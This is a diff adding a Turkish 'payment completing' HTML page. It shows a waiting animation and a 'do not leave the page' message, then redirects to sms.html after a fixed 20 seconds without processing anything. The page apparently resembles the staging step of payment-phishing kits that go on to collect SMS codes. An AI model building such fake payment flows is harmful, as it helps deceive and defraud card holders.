@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="tr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ödeme Tamamlanıyor</title>
+    <!-- Ek stil dosyalarını ekleyebilirsiniz -->
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Arial', sans-serif;
+            background-color: white; /* Açık mavi arkaplan rengi */
+        }
+
+        header {
+            background-color: #4A90E2; /* Açık mavi header arkaplan rengi */
+            padding: 10px;
+            text-align: center;
+        }
+
+        header img {
+            width: 100px; /* Logo genişliği */
+        }
+
+        .body_wrapper {
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            text-align: center;
+        }
+
+        img {
+            width: 100%; /* Resmi genişliğe sığacak şekilde ayarla */
+            max-width: 100%;
+            height: auto;
+        }
+
+        h5 {
+            font-size: 1.2em;
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <img src="./logo.png" alt="Logo">
+    </header>
+
+    <div class="body_wrapper frm-vh-md-100">
+        <img src="bekle.gif" alt="Ödeme Tamamlanıyor">
+
+        <h5>Ödeme işleminiz gerçekleştiriliyor...<br>Lütfen sayfadan çıkmayınız.</h5>
+    </div>
+
+    <script>
+        setTimeout(function () {
+            window.location.href = "sms.html";
+        }, 20000);
+    </script>
+</body>
+
+</html>
